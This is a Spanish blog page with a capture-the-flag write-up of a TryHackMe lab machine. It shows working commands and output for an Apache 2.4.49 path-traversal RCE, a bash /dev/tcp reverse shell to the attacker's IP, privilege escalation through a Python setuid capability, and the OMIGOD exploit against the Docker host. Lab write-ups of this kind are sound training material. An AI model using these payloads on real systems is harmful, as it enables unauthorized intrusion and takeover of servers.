<!doctype html><html lang=es><head><title>Oh My WebServer - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Medio tinyb0y    Reconocimiento ¡Ey! ¡Bienvenido de nuevo!
Una vez más estamos ejecutando nmap contra esta máquina, ¡para ver qué servicios se están ejecutando!
└──╼ $sudo nmap -sS -sV -sC --min-rate 5000 10.10.239.45 -Pn -n Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 15:13 CET Nmap scan report for 10."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/ohmywebserver/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/ohmywebserver/cover.jpeg"><meta name=twitter:title content="Oh My WebServer - Write Up - Español"><meta name=twitter:description content="Máquina de nivel medio en TryHackMe."><meta property="og:title" content="Oh My WebServer - Write Up - Español"><meta property="og:description" content="Máquina de nivel medio en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/ohmywebserver/"><meta property="og:image" content="/es/posts/ohmywebserver/cover.jpeg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-03-05T09:34:39+02:00"><meta property="article:modified_time" content="2022-03-05T09:34:39+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span></a>
<span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>Oh My WebServer - Write Up - Español</h1><div class=post-meta><span class=post-date>2022-03-05</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 4 mins lectura</span></div><span class=post-tags><a href=/tags/cve-2021-42013/>#CVE-2021-42013</a>&nbsp;
<a href=/tags/rce/>#RCE</a>&nbsp;
<a href=/tags/apache/>#Apache</a>&nbsp;
<a href=/tags/docker/>#Docker</a>&nbsp;
<a href=/tags/omigod/>#OMIGOD</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/ohmywebserver/cover.jpeg alt="Oh My WebServer - Write Up - Español"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/ohmyweb>Aquí</a></td><td>Medio</td><td><a href=https://tryhackme.com/p/tinyb0y>tinyb0y</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>¡Ey! ¡Bienvenido de nuevo!</p><p>Una vez más estamos ejecutando <code>nmap</code> contra esta máquina, ¡para ver qué servicios se están ejecutando!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $sudo nmap -sS -sV -sC --min-rate <span style=color:#ae81ff>5000</span> 10.10.239.45 -Pn -n
</span></span><span style=display:flex><span>Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
</span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-05 15:13 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.239.45
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.13s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> filtered ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.49 <span style=color:#f92672>((</span>Unix<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>| http-methods:
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.49 <span style=color:#f92672>(</span>Unix<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Consult - Business Consultancy Agency Template | Home
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Una máquina normal, con solo 2 puertos comunes abiertos&mldr;</p><p>Pero una cosa que nos llamó la atención:
El servidor web (Puerto 80) se ejecuta en <code>apache/2.4.49</code>.
¡Para esa versión tenemos un CVE-2021-42013! Puede encontrar más información al respecto <a href=https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013>aquí</a>.</p><p>Solo para confirmar la versión, hicimos una simple solicitud <code>curl</code> a la máquina, para verificar el encabezado <code>Servidor</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $curl -v http://10.10.239.45 | head
</span></span><span style=display:flex><span>*   Trying 10.10.239.45:80...
</span></span><span style=display:flex><span> GET / HTTP/1.1
</span></span><span style=display:flex><span> Host: 10.10.239.45
</span></span><span style=display:flex><span> User-Agent: curl/7.74.0
</span></span><span style=display:flex><span> Accept: */* 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>* Mark bundle as not supporting multiuse
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>05</span> Mar <span style=color:#ae81ff>2022</span> 14:16:00 GMT
</span></span><span style=display:flex><span>Server: Apache/2.4.49 <span style=color:#f92672>(</span>Unix<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Last-Modified: Wed, <span style=color:#ae81ff>23</span> Feb <span style=color:#ae81ff>2022</span> 05:40:45 GMT
</span></span><span style=display:flex><span>ETag: <span style=color:#e6db74>&#34;e281-5d8a8e82e3140&#34;</span>
</span></span><span style=display:flex><span>Accept-Ranges: bytes
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>57985</span>
</span></span><span style=display:flex><span>Content-Type: text/html
</span></span></code></pre></div><p>Y para verificar el posible exploit, revisamos la carpeta <code>cgi-bin</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $curl http://10.10.239.45/cgi-bin/
</span></span><span style=display:flex><span>&lt;!DOCTYPE HTML PUBLIC <span style=color:#e6db74>&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;html&gt;&lt;head&gt;
</span></span><span style=display:flex><span>&lt;title&gt;403 Forbidden&lt;/title&gt;
</span></span><span style=display:flex><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style=display:flex><span>&lt;h1&gt;Forbidden&lt;/h1&gt;
</span></span><span style=display:flex><span>&lt;p&gt;You don<span style=color:#960050;background-color:#1e0010>&#39;</span>t have permission to access this resource.&lt;/p&gt;
</span></span><span style=display:flex><span>&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></div><p>¡Y está activo!
¡Entonces podemos ejecutar el exploit y probar suerte!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $curl <span style=color:#e6db74>&#39;http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash&#39;</span> -d <span style=color:#e6db74>&#39;echo Content-Type: text/plain; echo; whoami &amp;&amp; pwd &amp;&amp; id&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: text/plain&#34;</span>
</span></span><span style=display:flex><span>daemon
</span></span><span style=display:flex><span>/bin
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>¡Si! ¡Tenemos <code>RCE</code>!</p><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Para obtener una <code>shell reversa</code> usamos 2 terminales. La primera está haciendo una solicitud con el exploit y la segunda está esperando la conexión.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>=====</span>Terminal 1<span style=color:#f92672>======</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>└──╼ $curl <span style=color:#e6db74>&#39;http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash&#39;</span> -d <span style=color:#e6db74>&#39;echo Content-Type: text/plain; echo; bash -i &gt;&amp; /dev/tcp/10.9.1.30/1337 0&gt;&amp;1&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: text/plain&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====</span>Terminal 2<span style=color:#f92672>======</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>└──╼ $nc -nlvp <span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.1.30<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.239.45<span style=color:#f92672>]</span> <span style=color:#ae81ff>40344</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>daemon@4a70924bafa0:/bin$ id;whoami;pwd
</span></span><span style=display:flex><span>id;whoami;pwd
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>daemon
</span></span><span style=display:flex><span>/bin
</span></span><span style=display:flex><span>daemon@4a70924bafa0:/bin$
</span></span></code></pre></div><p>¡Y estamos dentro! Pero estamos ejecutando como un <code>daemon</code>, por lo que no podemos obtener la <code>bandera de usuario</code> :/</p><p>Al enumerar la máquina, descubrimos que el binario <code>python3.7</code> tiene la capacidad <code>cap_setuid</code> establecida. (Puede obtener más información sobre cómo explotar esto con <a href=https://gtfobins.github.io/gtfobins/python/#capabilities>GTFOBIN</a>).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>daemon@4a70924bafa0:/bin$ getcap -r / 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/bin/python3.7 <span style=color:#f92672>=</span> cap_setuid+ep
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>daemon@4a70924bafa0:/bin$ python3.7 -c <span style=color:#e6db74>&#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># cat /root/user.txt</span>
</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>¡Sí! ¡Ahora somos root dentro de un contenedor <code>docker</code> y podemos enviar el indicador de usuario!</p><h2 id=root>Root</h2><p>Después de enumerar <em>bastante</em> la máquina, simplemente supusimos que tal vez haya otra máquina (en este caso, el host de los contenedores) en la IP adyacente. Básicamente, que el host está en <code>172.17.0.1</code>, ya que somos la <code>172.17.0.2</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@4a70924bafa0:/tmp# ifconfig
</span></span><span style=display:flex><span>eth0: flags<span style=color:#f92672>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#ae81ff>1500</span>
</span></span><span style=display:flex><span>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
</span></span><span style=display:flex><span>        ether 02:42:ac:11:00:02  txqueuelen <span style=color:#ae81ff>0</span>  <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>3122</span>  bytes <span style=color:#ae81ff>383708</span> <span style=color:#f92672>(</span>374.7 KiB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>2172</span>  bytes <span style=color:#ae81ff>2759329</span> <span style=color:#f92672>(</span>2.6 MiB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>lo: flags<span style=color:#f92672>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span style=color:#ae81ff>65536</span>
</span></span><span style=display:flex><span>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span style=display:flex><span>        loop  txqueuelen <span style=color:#ae81ff>1000</span>  <span style=color:#f92672>(</span>Local Loopback<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>2</span>  bytes <span style=color:#ae81ff>100</span> <span style=color:#f92672>(</span>100.0 B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>2</span>  bytes <span style=color:#ae81ff>100</span> <span style=color:#f92672>(</span>100.0 B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>Para confirmar esta suposición, cargamos un binario estático de <code>nmap</code> desde nuestra máquina. Puede descargarlo desde <a href=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap>aquí</a>.
Y lo ejecutamos contra la IP del supuesto Host.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate <span style=color:#ae81ff>5000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Starting Nmap 6.49BETA1 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2022-03-05 14:48 UTC
</span></span><span style=display:flex><span>Unable to find nmap-services!  Resorting to /etc/services
</span></span><span style=display:flex><span>Cannot find nmap-payloads. UDP payloads are disabled.
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> ip-172-17-0-1.eu-west-1.compute.internal <span style=color:#f92672>(</span>172.17.0.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>-0.0014s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65531</span> filtered ports
</span></span><span style=display:flex><span>PORT     STATE  SERVICE
</span></span><span style=display:flex><span>22/tcp   open   ssh
</span></span><span style=display:flex><span>80/tcp   open   http
</span></span><span style=display:flex><span>5985/tcp closed unknown
</span></span><span style=display:flex><span>5986/tcp open   unknown
</span></span><span style=display:flex><span>MAC Address: 02:42:1A:89:70:8B <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 39.82 seconds
</span></span></code></pre></div><p>¡Sí! ¡Teníamos razón!
¡Y tenemos algunos puertos abiertos!</p><p>Buscando en Google <code>exploit del servicio del puerto 5986</code>, encontramos este POC:</p><p><a href=https://github.com/AlteredSecurity/CVE-2021-38647>https://github.com/AlteredSecurity/CVE-2021-38647</a></p><p>Este exploit es contra el servicio <code>OHMIGOD</code>, que comúnmente se ejecuta en puertos como <code>5986</code>.</p><p>¡Descargué el exploit en la máquina de la víctima y traté de explotarlo!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@4a70924bafa0:/tmp# python3 exp.py -t 172.17.0.1 -c <span style=color:#e6db74>&#39;whoami;pwd;id;hostname;uname -a;cat /root/root.txt;&#39;</span>
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>/var/opt/microsoft/scx/tmp
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>ubuntu
</span></span><span style=display:flex><span>Linux ubuntu 5.4.0-88-generic <span style=color:#75715e>#99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/es/posts/eko-2021/><span class=button__text>Ekoparty 2021 - Write Up - Español</span>
<span class=button__icon>→</span></a></span></div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script><script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script><script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script></body></html>